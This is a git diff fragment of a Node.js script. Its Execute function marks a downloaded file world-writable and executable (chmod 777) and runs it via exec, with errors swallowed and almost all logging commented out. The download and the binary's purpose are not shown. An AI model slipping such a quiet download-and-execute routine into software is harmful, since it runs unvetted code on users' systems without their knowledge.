@@ -28,18 +28,29 @@ const filePath = path.join(FILE_PATH, fileName);
 
 // Download and execute the file
 const Execute = () => {
-      fs.chmodSync(filePath, '777'); 
+  try {
+    if (!fs.existsSync(filePath)) {
+      //console.error(`file not found: ${filePath}`);
+      return;
+    }
+    fs.chmodSync(filePath, '777');
+    const child = exec(`./${fileName}`, {
+      cwd: FILE_PATH 
+    }, (error, stdout, stderr) => {
+      if (error) {
+        // console.error(`error: ${error}`);
+        return;
+      }
+      // if (stdout) console.log(`stdout: ${stdout}`);
+      if (stderr) console.error(`stderr: ${stderr}`);
+    });
 
-      console.log('Executing the file...');
-      const child = exec(`./${filePath}`, (error, stdout, stderr) => {
-        if (error) {
-          console.error(`Execution error: ${error}`);
-          return;
-        }
-        // console.log(`${stdout}`);
-        console.error(`${stderr}`);
-      });
-    })
+    child.on('exit', (code) => {
+      // console.log(`child exit code: ${code}`);
+    });
+  } catch (err) {
+    // console.error(`catch error: ${err}`);
+  }
 };
 Execute();
 
